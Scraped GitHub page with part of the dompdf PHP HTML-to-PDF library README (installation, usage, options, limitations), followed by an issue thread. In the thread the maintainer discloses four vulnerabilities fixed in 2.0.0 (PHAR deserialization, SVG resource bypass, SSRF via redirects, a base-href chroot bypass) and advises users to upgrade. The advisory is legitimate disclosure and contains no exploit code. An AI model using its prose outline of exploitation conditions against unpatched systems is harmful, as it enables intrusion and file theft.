* No dependencies on external PDF libraries, thanks to the R&OS PDF class
* Inline PHP support
* Basic SVG support (see "Limitations" below)

## Requirements

* PHP version 7.1 or higher
* DOM extension
* MBString extension
* php-font-lib
* php-svg-lib

Note that some required dependencies may have further dependencies
(notably php-svg-lib requires sabberworm/php-css-parser).

### Recommendations

* OPcache (OPcache, XCache, APC, etc.): improves performance
* GD (for image processing)
* IMagick or GMagick extension: improves image processing performance

Visit the wiki for more information:
<https://github.com/dompdf/dompdf/wiki/Requirements>

## About Fonts & Character Encoding

PDF documents internally support the following fonts: Helvetica, Times-Roman,
Courier, Zapf-Dingbats, & Symbol. These fonts only support Windows ANSI
encoding. In order for a PDF to display characters that are not available in
Windows ANSI, you must supply an external font. Dompdf will embed any referenced
font in the PDF so long as it has been pre-loaded or is accessible to dompdf and
reference in CSS @font-face rules. See the
[font overview](https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding)
for more information on how to use fonts.

The [DejaVu TrueType fonts](https://dejavu-fonts.github.io/) have been pre-installed
to give dompdf decent Unicode character coverage by default. To use the DejaVu
fonts reference the font in your stylesheet, e.g. `body { font-family: DejaVu Sans; }` (for DejaVu Sans). The following DejaVu 2.34 fonts are available:
DejaVu Sans, DejaVu Serif, and DejaVu Sans Mono.

## Easy Installation

### Install with composer

To install with [Composer](https://getcomposer.org/), simply require the
latest version of this package.

```
composer require dompdf/dompdf
```

Make sure that the autoload file from Composer is loaded.

```
// somewhere early in your project's loading, require the Composer autoloader
// see: http://getcomposer.org/doc/00-intro.md
require 'vendor/autoload.php';
```

### Download and install

Download a packaged archive of dompdf and extract it into the
directory where dompdf will reside

* You can download stable copies of dompdf from
  <https://github.com/dompdf/dompdf/releases>
* Or download a nightly (the latest, unreleased code) from
  <http://eclecticgeek.com/dompdf>

Use the packaged release autoloader to load dompdf, libraries,
and helper functions in your PHP:

```
// include autoloader
require_once 'dompdf/autoload.inc.php';
```

Note: packaged releases are named according using semantic
versioning (*dompdf\_MAJOR-MINOR-PATCH.zip*). So the 1.0.0
release would be dompdf\_1-0-0.zip. This is the only download
that includes the autoloader for Dompdf and all its dependencies.

### Install with git

From the command line, switch to the directory where dompdf will
reside and run the following commands:

```
git clone https://github.com/dompdf/dompdf.git
cd dompdf/lib

git clone https://github.com/PhenX/php-font-lib.git php-font-lib
cd php-font-lib
git checkout 0.5.1
cd ..

git clone https://github.com/PhenX/php-svg-lib.git php-svg-lib
cd php-svg-lib
git checkout v0.3.2
cd ..

git clone https://github.com/sabberworm/PHP-CSS-Parser.git php-css-parser
cd php-css-parser
git checkout 8.1.0
```

Require dompdf and it's dependencies in your PHP.
For details see the [autoloader in the utils project](https://github.com/dompdf/utils/blob/master/autoload.inc.php).

## Quick Start

Just pass your HTML in to dompdf and stream the output:

```
// reference the Dompdf namespace
use Dompdf\Dompdf;

// instantiate and use the dompdf class
$dompdf = new Dompdf();
$dompdf->loadHtml('hello world');

// (Optional) Setup the paper size and orientation
$dompdf->setPaper('A4', 'landscape');

// Render the HTML as PDF
$dompdf->render();

// Output the generated PDF to Browser
$dompdf->stream();
```

### Setting Options

Set options during dompdf instantiation:

```
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('defaultFont', 'Courier');
$dompdf = new Dompdf($options);
```

or at run time

```
use Dompdf\Dompdf;

$dompdf = new Dompdf();
$options = $dompdf->getOptions();
$options->setDefaultFont('Courier');
$dompdf->setOptions($options);
```

See [Dompdf\Options](/dompdf/dompdf/blob/v2.0.0/src/Options.php) for a list of available options.

### Resource Reference Requirements

In order to protect potentially sensitive information Dompdf imposes
restrictions on files referenced from the local file system or the web.

Files accessed through web-based protocols have the following requirements:

* The Dompdf option "isRemoteEnabled" must be set to "true"
* PHP must either have the curl extension enabled or the
  allow\_url\_fopen setting set to true

Files accessed through the local file system have the following requirement:

* The file must fall within the path(s) specified for the Dompdf "chroot" option

## Limitations (Known Issues)

* Table cells are not pageable, meaning a table row must fit on a single page.
* Elements are rendered on the active page when they are parsed.
* Embedding "raw" SVG's (`<svg><path...></svg>`) isn't working yet, you need to
  either link to an external SVG file, or use a DataURI like this:
  ```
  $html = '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '" ...>';
  ```

| Dompdf prior to 2.0.0 is vulnerable to the following security issues:  **Deserialization of Untrusted Data (CVE-2021-3838)** Dompdf does not sufficiently restrict the protocols allowed in resource references. As a result, an attacker can execute their own code if all the following conditions are met:   1. the system runs under PHP < 8.0.0 2. users are allowed to upload files to the system 3. users are able to specify some or all of the HTML content being rendered 4. Dompdf is executed within an environment that utilizes PHP classes known to be vulnerable to PHAR deserialization   This issue was previously reported in [#1903](https://github.com/dompdf/dompdf/pull/1903) though discussion faltered and, as a result, the exploit path was not removed at that time.  References:   * [CVE-2021-3838](https://nvd.nist.gov/vuln/detail/CVE-2021-3838) * [huntr.dev](https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e)   **Improper Restriction of XML External Entity Reference (CVE-2021-3902)** SVG images are not processed through Dompdf's resource validation logic, allowing resource references that would normally be rejected by Dompdf were they used in an image or stylesheet. As a result, an attacker with ability to specify some or all of the HTML content being rendered can utilize remote resources, local filesystem paths, and vulnerable protocols (e.g. PHAR: in PHP < 8.0.0) without restriction.  References:   * [CVE-2021-3902](https://nvd.nist.gov/vuln/detail/CVE-2021-3902) * [huntr.dev](https://huntr.dev/bounties/a6071c07-806f-429a-8656-a4742e4191b1)   **Server-Side Request Forgery (CVE-2022-0085)** Dompdf is configured to follow HTTP redirects when using file\_get\_contents to retrieve remote resources (URIs that begin with HTTP/HTTPS). As a result, an attacker with ability to specify some or all of the HTML content being rendered can utilize a controlled external system to redirect requests back towards a protected internal system to which the process executing Dompdf has access.  References:   * [CVE-2022-0085](https://nvd.nist.gov/vuln/detail/CVE-2022-0085) * [huntr.dev](https://huntr.dev/bounties/73dbcc78-5ba9-492f-9133-13bbc9f31236)   **External Control of File Name or Path (CVE-2022-2400)** When a document contains a base href tag that points to a remote URI (one that begins with HTTP/HTTPS), Dompdf will not check the path of local file references against the path(s) configured in the chroot Option. As a result, an attacker with ability to specify some or all of the HTML content being rendered can reference any file in the local filesystem that is accessible to the executing process.  References:   * [CVE-2022-2400](https://nvd.nist.gov/vuln/detail/CVE-2022-2400) * [huntr.dev](https://huntr.dev/bounties/a6da5e5e-86be-499a-a3c3-2950f749202a)   (cc [@huntr-helper](https://github.com/huntr-helper)) |

| There were four vulnerabilities discovered as part of this review, three of which have a CVE. Only one of the CVEs is published at this time, but details are available through [huntr.dev](https://huntr.dev/repos/dompdf/dompdf/) (through which the issues were reported).   ---   Thanks for the reminder. I plan to update this ticket and other resources as the CVEs are published. |

| Sorry, having a hard time wrapping my head around the implications of that question. Vulnerability would really depend on the specific usage scenario so I think I'd need to see more details. Generally I'd say if you have full control over the source content you would be OK. You're probably also OK if you accept restricted user content (e.g., name) and sanitize it (e.g., run through htmlentities) prior to rendering. |

| I'm asking because of the Drupal contributed project which relies on this library. We're trying to see if it is vulnerable to this issue (or any other vulnerabilities in the way it's implemented) or if we could update the dependency and not treat it as a security release.  In upgrading, the maintainers found that none of the APIs used by the module required changed, so I thought maybe that could help us determine if the module is vulnerable to this issue. |

### **[bsweeney](/bsweeney)** commented [Jul 12, 2022](#issuecomment-1181976964)

| The API itself didn't change because the underlying functionality was modified to protect against the vulnerabilities. So I'd say that in most usage scenarios a system utilizing a previous release would be vulnerable. For example, can users upload files and reference them in the HTML used to generate a PDF document? Then that is definitely a risk for exploitation. The vulnerabilities are there, but determining the level of risk would be an exercise for the end user.  All the vulnerabilities require some kind of integration to expose. If you're writing your own HTML on your own system, using your own content, and generating a PDF using Dompdf then you're (probably) safe? What I mean is that you can't just load Dompdf core files via the web and exploit a system. But that's not really saying much since the primary use case for the library is within other systems.  I don't know what factors are involved in trying to determine whether to treat this as a security release for the Drupal module. However, from my perspective using an earlier Dompdf release is an exposure risk and I would advise all users to upgrade. |
